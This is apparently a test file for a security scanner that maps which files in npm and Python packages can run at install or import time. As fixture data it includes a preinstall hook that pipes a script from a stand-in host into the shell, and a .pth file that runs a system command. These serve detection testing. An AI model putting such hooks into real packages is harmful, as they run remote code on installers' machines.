import { test } from "node:test";
import assert from "node:assert/strict";
import { buildReachGraph, isUnreachablePath, jsSpecifiers, pySpecifiers, scriptFiles } from "../../lib/engine/reach/graph.ts";
import { filesOf } from "../support/tar.ts";

test("jsSpecifiers finds literal require/import/export-from and flags non-literal calls", () => {
  const s = jsSpecifiers(`
    const a = require('./a');
    import b from "./b.js";
    import './side';
    export { c } from './c';
    export * from "./d";
    const e = await import('./e.mjs');
    // require(commented)
    /* import(blocked) */
  `);
  assert.deepEqual(s.literal.sort(), ["./a", "./b.js", "./c", "./d", "./e.mjs", "./side"]);
  assert.equal(s.nonLiteral, false);
  assert.equal(jsSpecifiers("const m = require(name);").nonLiteral, true);
  assert.equal(jsSpecifiers("import(`./x/${n}`)").nonLiteral, true);
  assert.equal(jsSpecifiers("require.resolve(x); obj.require(y)").nonLiteral, false);
});

test("pySpecifiers finds absolute, relative and dynamic imports", () => {
  const s = pySpecifiers(["import os, pkg.sub as s", "from pkg import helper", "from . import util", "from ..core import thing", "# import ignored"].join("\n"));
  assert.deepEqual(s.absolute.sort(), ["os", "pkg", "pkg.helper", "pkg.sub"]);
  assert.deepEqual(s.relative, [
    { level: 1, module: "", names: ["util"] },
    { level: 2, module: "core", names: ["thing"] },
  ]);
  assert.equal(s.nonLiteral, false);
  assert.equal(pySpecifiers("importlib.import_module(name)").nonLiteral, true);
  assert.equal(pySpecifiers("importlib.import_module('json')").nonLiteral, false);
  assert.equal(pySpecifiers("__import__(x)").nonLiteral, true);
});

test("scriptFiles extracts files named by install hook commands", () => {
  assert.deepEqual(scriptFiles("node ./scripts/post.js && sh setup.sh"), ["scripts/post.js", "setup.sh"]);
  assert.deepEqual(scriptFiles("python3 -u build.py"), ["build.py"]);
  assert.deepEqual(scriptFiles("node-gyp rebuild"), []);
});

test("npm: install hooks, main, exports, bin and their imports are reachable; tests and docs are not", () => {
  const g = buildReachGraph(
    filesOf({
      "package.json": JSON.stringify({
        name: "demo",
        main: "lib/index.js",
        exports: { ".": { import: "./esm/index.mjs", require: "./lib/index.js" }, "./feature": "./lib/feature.js" },
        bin: { demo: "bin/cli.js" },
        scripts: { postinstall: "node scripts/post.js", test: "node test/run.js" },
      }),
      "scripts/post.js": "require('./helper');",
      "scripts/helper.js": "module.exports = 1;",
      "lib/index.js": "const u = require('./util'); const self = require('demo/lib/extra');",
      "lib/util/index.js": "module.exports = {};",
      "lib/extra.js": "module.exports = {};",
      "lib/feature.js": "export {} from './deep/x.js';",
      "lib/deep/x.js": "export const x = 1;",
      "esm/index.mjs": "import '../lib/util/index.js';",
      "bin/cli.js": "#!/usr/bin/env node\nrequire('../lib/index.js')",
      "lib/orphan.js": "module.exports = 'never imported';",
      "test/run.js": "require('../lib/index.js')",
      "docs/guide.md": "# guide",
    }),
  );
  assert.equal(g.unbounded, false);
  assert.equal(g.classify("scripts/post.js"), "install");
  assert.equal(g.classify("scripts/helper.js"), "install");
  assert.equal(g.classify("package.json"), "install");
  for (const f of ["lib/index.js", "lib/util/index.js", "lib/extra.js", "lib/feature.js", "lib/deep/x.js", "esm/index.mjs", "bin/cli.js"]) {
    assert.equal(g.classify(f), "import", f);
  }
  assert.equal(g.classify("lib/orphan.js"), "unreachable");
  assert.equal(g.classify("test/run.js"), "unreachable");
  assert.equal(g.classify("docs/guide.md"), "unreachable");
});

test("npm: inline install commands with no file are recorded; binding.gyp is install surface", () => {
  const g = buildReachGraph(
    filesOf({
      "package.json": JSON.stringify({ name: "n", scripts: { preinstall: "curl -s http://x.example/i.sh | sh" } }),
      "binding.gyp": `{"targets":[{"sources":["src/addon.cc"]}]}`,
      "src/addon.cc": "int x;",
      "index.js": "",
    }),
  );
  assert.deepEqual(g.inlineInstallCommands, [{ hook: "preinstall", command: "curl -s http://x.example/i.sh | sh" }]);
  assert.equal(g.classify("binding.gyp"), "install");
  assert.equal(g.classify("src/addon.cc"), "install");
  assert.equal(g.classify("index.js"), "import");
});

test("a non-literal require makes the set unbounded, still excluding tests/docs/examples/infra", () => {
  const g = buildReachGraph(
    filesOf({
      "package.json": JSON.stringify({ name: "u", main: "index.js" }),
      "index.js": "const plugin = require(process.env.PLUGIN);",
      "plugins/a.js": "module.exports = 1;",
      "tests/a.test.js": "",
      "__tests__/b.js": "",
      "examples/demo.js": "",
      "benchmark/run.js": "",
      ".github/workflows/x.js": "",
      "terraform/main.js": "",
      "Dockerfile": "FROM node",
      "README.md": "# hi",
    }),
  );
  assert.equal(g.unbounded, true);
  assert.deepEqual(g.unboundedFrom, ["index.js"]);
  assert.equal(g.classify("plugins/a.js"), "import");
  for (const f of ["tests/a.test.js", "__tests__/b.js", "examples/demo.js", "benchmark/run.js", ".github/workflows/x.js", "terraform/main.js", "Dockerfile", "README.md"]) {
    assert.equal(g.classify(f), "unreachable", f);
  }
});

test("unbounded from an install file classifies unknown code as install", () => {
  const g = buildReachGraph(
    filesOf({
      "package.json": JSON.stringify({ name: "u", scripts: { install: "node i.js" } }),
      "i.js": "require(['./a','./b'][Date.now() % 2])",
      "a.js": "",
    }),
  );
  assert.equal(g.classify("a.js"), "install");
});

test("test code is never install- or import-reachable by inference, in either unbounded case", () => {
  const files = {
    "a.js": "",
    "test/keys.js": "const k = 'key-shaped-string';",
    "packages/x/__tests__/t.js": "",
    "packages/x/src/thing.test.ts": "",
    "packages/x/__mocks__/m.js": "",
    "fixtures/f.js": "",
    "examples/e.js": "",
    "e2e/run.js": "",
  };
  const nonLiteral = buildReachGraph(filesOf({ "package.json": JSON.stringify({ name: "u", scripts: { install: "node i.js" } }), "i.js": "require(['./a','./b'][Date.now() % 2])", ...files }));
  const hook = buildReachGraph(filesOf({ "package.json": JSON.stringify({ name: "u", scripts: { postinstall: "make all" } }), "Makefile": "all:\n\tnode a.js\n", ...files }));
  for (const g of [nonLiteral, hook]) {
    assert.equal(g.classify("a.js"), "install");
    for (const p of Object.keys(files).filter((f) => f !== "a.js")) assert.equal(g.classify(p), "unreachable", p);
  }
});

test("python: setup.py, in-tree backend and .pth are install; packages and console scripts are import", () => {
  const g = buildReachGraph(
    filesOf({
      "setup.py": "from setuptools import setup\nimport build_helpers\nsetup(entry_points={'console_scripts': ['tool = mypkg.cli:main']})",
      "build_helpers.py": "",
      "pyproject.toml": '[build-system]\nbuild-backend = "backend.hooks"\nbackend-path = ["_build"]\n[project.scripts]\nother = "mypkg.other:run"\n',
      "_build/backend/__init__.py": "",
      "_build/backend/hooks.py": "",
      "evil.pth": "import os; os.system('x')",
      "src/mypkg/__init__.py": "from . import core\nfrom .sub import thing",
      "src/mypkg/core.py": "import json",
      "src/mypkg/sub/__init__.py": "",
      "src/mypkg/sub/thing.py": "",
      "src/mypkg/cli.py": "",
      "src/mypkg/other.py": "",
      "src/mypkg/unused.py": "",
      "tests/test_x.py": "import mypkg",
    }),
  );
  assert.deepEqual(g.ecosystems, ["python"]);
  for (const f of ["setup.py", "build_helpers.py", "_build/backend/__init__.py", "_build/backend/hooks.py", "evil.pth"]) assert.equal(g.classify(f), "install", f);
  for (const f of ["src/mypkg/__init__.py", "src/mypkg/core.py", "src/mypkg/sub/__init__.py", "src/mypkg/sub/thing.py", "src/mypkg/cli.py", "src/mypkg/other.py"]) {
    assert.equal(g.classify(f), "import", f);
  }
  assert.equal(g.classify("src/mypkg/unused.py"), "unreachable");
  assert.equal(g.classify("tests/test_x.py"), "unreachable");
});

test("isUnreachablePath matches path segments, not substrings", () => {
  assert.equal(isUnreachablePath("src/attestation/x.js"), false);
  assert.equal(isUnreachablePath("src/latest/x.js"), false);
  assert.equal(isUnreachablePath("spec/x.js"), true);
  assert.equal(isUnreachablePath("pkg/fixtures/x.js"), true);
  assert.equal(isUnreachablePath("k8s/deploy.js"), true);
});

test("install hooks that reach code indirectly are followed: node -e require, npm run chains, node -r, scripts calling scripts", () => {
  const g = buildReachGraph(
    filesOf({
      "package.json": JSON.stringify({
        name: "h",
        main: "index.js",
        scripts: { preinstall: `node -e "require('./test/steal')"`, postinstall: "npm run setup", setup: "cd tools && node -r ../test/hook.js run.js", prepare: "sh ./scripts/a.sh" },
      }),
      "index.js": "",
      "test/steal.js": "",
      "test/hook.js": "",
      "tools/run.js": "",
      "scripts/a.sh": "#!/bin/sh\nnode ../test/b.js\n",
      "test/b.js": "",
      "test/untouched.js": "",
    }),
  );
  for (const f of ["test/steal.js", "test/hook.js", "tools/run.js", "scripts/a.sh", "test/b.js"]) assert.equal(g.classify(f), "install", f);
  assert.equal(g.classify("test/untouched.js"), "unreachable", "tests not named by any hook stay unreachable");
  assert.equal(g.unbounded, false);
});

test("an install hook that runs an unknown program makes every non-doc file install-reachable", () => {
  const g = buildReachGraph(
    filesOf({
      "package.json": JSON.stringify({ name: "m", scripts: { install: "make all" } }),
      "Makefile": "all:\n\tnode test/x.js\n",
      "test/x.js": "",
      "README.md": "# m",
    }),
  );
  assert.equal(g.unbounded, true);
  assert.ok(g.unboundedFrom.includes("package.json scripts.install"));
  assert.equal(g.classify("test/x.js"), "install");
  assert.equal(g.classify("README.md"), "unreachable");
});

test("no root manifest after stripping: non-test files are reachable, never silently unreachable", () => {
  const g = buildReachGraph(filesOf({ "lib/steal.js": "", "test/a.js": "" }));
  assert.equal(g.unbounded, true);
  assert.equal(g.classify("lib/steal.js"), "import");
  assert.equal(g.classify("test/a.js"), "unreachable");
});

test("unbounded install hook: only files an installer or entry point in the VM can run are reachable", () => {
  const enc = new TextEncoder();
  // openclaw 104730b shape: a postinstall the graph cannot name, plus Swift, Rust and agent scripts.
  const files = new Map<string, Uint8Array>([
    ["package.json", enc.encode(JSON.stringify({ name: "x", scripts: { postinstall: "node $SCRIPT" } }))],
    ["scripts/a.mjs", enc.encode("export {}\n")],
    ["apps/macos/Sources/AppState+Preview.swift", enc.encode("let preview = true\n")],
    ["apps/shared/src/tests.rs", enc.encode("fn main() {}\n")],
    ["bin/run", enc.encode("#!/bin/sh\necho hi\n")],
    ["assets/notes", enc.encode("plain text, no shebang\n")],
  ]);
  const g = buildReachGraph(files);
  assert.equal(g.unbounded, true);
  assert.equal(g.classify("scripts/a.mjs"), "install");
  assert.equal(g.classify("bin/run"), "install", "a shebang script can run");
  assert.equal(g.classify("apps/macos/Sources/AppState+Preview.swift"), "unreachable", "no Swift toolchain runs at install");
  assert.equal(g.classify("apps/shared/src/tests.rs"), "unreachable", "no Rust toolchain runs at install");
  assert.equal(g.classify("assets/notes"), "unreachable");
});
